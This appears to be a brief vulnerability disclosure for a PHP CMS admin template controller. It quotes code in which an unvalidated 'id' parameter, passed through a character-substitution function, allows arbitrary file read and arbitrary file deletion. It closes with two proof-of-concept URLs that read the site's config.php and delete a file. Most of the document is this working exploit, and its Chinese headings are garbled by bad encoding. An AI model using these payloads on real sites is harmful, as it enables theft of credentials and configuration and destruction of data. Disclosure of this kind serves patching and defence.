�����ļ���ȡ©�����룺
Lib\Admin\Action\TplAction.class.php��
51-60��
	public function add(){
		$filename = admin_gxl_url_repalce(str_replace('*','.',trim($_GET['id'])));
		if (empty($filename)) {
			$this->error('ģ�����Ʋ���Ϊ��');
		}
		$content = read_file($filename);
		$this->assign('filename',$filename);
		$this->assign('content',htmlspecialchars($content));
		$this->display('./Public/system/tpl_add.html');
	}
/Lib/Admin/Common/function.php��
372-380��
function admin_gxl_url_repalce($xmlurl, $order = "asc")
{
	if ($order == "asc") {
		return str_replace(array("|", "@", "#", "||"), array("/", "=", "&", "//"), $xmlurl);
	}
	else {
		return str_replace(array("/", "=", "&", "||"), array("|", "@", "#", "//"), $xmlurl);
	}
}

�����ļ�ɾ��©�����룺
Lib\Admin\Action\TplAction.class.php��
87-98��
public function del(){
$id = admin_gxl_url_repalce(str_replace('*','.',trim($_GET['id'])));
if (!substr(sprintf("%o",fileperms($id)),-3)){
$this->error('��ɾ��Ȩ��');
}
@unlink($id);
if (!empty($_SESSION['tpl_jumpurl'])) {
$this->assign("jumpUrl",$_SESSION['tpl_jumpurl']);
}else{
$this->assign("jumpUrl",'?s=Admin/Tpl/Show');
}
$this->success('ɾ���ɹ�');




POC��
�����ļ���ȡ��http://localhost/index.php?s=Admin-Tpl-ADD-id-.|Runtime|Conf||config*php
�����ļ�ɾ����http://localhost/index.php?s=Admin-Tpl-Del-id-.|Runtime|Conf||1*php
